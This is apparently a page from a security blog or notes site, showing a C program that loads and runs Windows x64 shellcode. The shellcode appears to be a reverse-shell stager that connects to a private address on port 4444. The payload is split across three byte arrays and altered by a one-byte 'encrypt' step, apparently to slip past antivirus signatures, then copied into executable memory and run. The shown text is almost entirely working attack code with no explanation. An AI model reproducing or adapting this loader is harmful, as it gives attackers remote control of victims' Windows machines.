<span class="line"><span>#include &lt;stdlib.h&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>unsigned char buf[] =</span></span>
<span class="line"><span>&quot;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52&quot;</span></span>
<span class="line"><span>&quot;\\x51\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x56\\x48&quot;</span></span>
<span class="line"><span>&quot;\\x8b\\x52\\x20\\x4d\\x31\\xc9\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a&quot;</span></span>
<span class="line"><span>&quot;\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41&quot;</span></span>
<span class="line"><span>&quot;\\x01\\xc1\\xe2\\xef\\x52\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0&quot;</span></span>
<span class="line"><span>&quot;\\x41\\x51\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\\x85\\x72\\x00\\x00\\x00\\x8b&quot;</span></span>
<span class="line"><span>&quot;\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x8b\\x48&quot;</span></span>
<span class="line"><span>&quot;\\x18\\x50\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x4d\\x31\\xc9\\x48&quot;</span></span>
<span class="line"><span>&quot;\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x48\\x31\\xc0\\xac\\x41\\xc1&quot;</span></span>
<span class="line"><span>&quot;\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45&quot;</span></span>
<span class="line"><span>&quot;\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b&quot;</span></span>
<span class="line"><span>&quot;\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01&quot;</span></span>
<span class="line"><span>&quot;\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48&quot;</span></span>
<span class="line"><span>&quot;\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9&quot;</span></span>
<span class="line"><span>&quot;\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\\x00&quot;</span></span>
<span class="line"><span>&quot;\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\\x89\\xe5&quot;</span></span>
<span class="line"><span>&quot;\\x49\\xbc\\x02\\x00\\x11\\x5c\\xc0\\xa8\\x01\\x15\\x41\\x54\\x49\\x89\\xe4&quot;</span></span>
<span class="line"><span>&quot;\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\\x89\\xea\\x68&quot;</span></span>
<span class="line"><span>&quot;\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a&quot;</span></span>
<span class="line"><span>&quot;\\x41\\x5e\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89&quot;</span></span>
<span class="line"><span>&quot;\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5&quot;</span></span>
<span class="line"><span>&quot;\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba&quot;</span></span>
<span class="line"><span>&quot;\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\x49\\xff\\xce\\x75\\xe5&quot;</span></span>
<span class="line"><span>&quot;\\xe8\\x93\\x00\\x00\\x00\\x48\\x83\\xec\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9&quot;</span></span>
<span class="line"><span>&quot;\\x6a\\x04\\x41\\x58\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5&quot;</span></span>
<span class="line"><span>&quot;\\x83\\xf8\\x00\\x7e\\x55\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41&quot;</span></span>
<span class="line"><span>&quot;\\x59\\x68\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41&quot;</span></span>
<span class="line"><span>&quot;\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31&quot;</span></span>
<span class="line"><span>&quot;\\xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8&quot;;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>unsigned char end[] = &quot;\\x00\\x00\\x41\\x58\\x6a\\x00\\x5a\\x41\\xba\\x0b\\x2f\\x0f\\x30\\xff\\xd5&quot;</span></span>
<span class="line"><span>&quot;\\x57\\x59\\x41\\xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x49\\xff\\xce\\xe9\\x3c&quot;</span></span>
<span class="line"><span>&quot;\\xff\\xff\\xff\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\\x85\\xf6\\x75\\xb4\\x41&quot;</span></span>
<span class="line"><span>&quot;\\xff\\xe7\\x58\\x6a\\x00\\x59\\x49\\xc7\\xc2\\xf0\\xb5\\xa2\\x56\\xff\\xd5&quot;;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>unsigned char bypass[] = &quot;\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x41\\x57\\x59\\x68\\x00\\x40&quot;;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>void encrypt(char * buf) {</span></span>
<span class="line"><span>    char key = 0x1;</span></span>
<span class="line"><span>    buf[63] -= key;</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span>
<span class="line"><span>int main(int argc, char** argv) {</span></span>
<span class="line"><span>    encrypt((char*)buf);</span></span>
<span class="line"><span>    void* exec = VirtualAlloc(0, 510, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    memcpy(exec, buf, sizeof(buf));</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    char * exec1 = (char *)exec + sizeof(buf)-1;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    memcpy((char *)exec1, bypass, sizeof(bypass));</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    char* exec2 = (char*)exec1 + sizeof(bypass) - 1;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    memcpy((char*)exec2, end, sizeof(end));</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    ((void(*)())exec)();</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    return 0;</span></span>
<span class="line"><span>}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,12)])}var u=o(c,[[`render`,l]]);export{s as _pageData,u as default};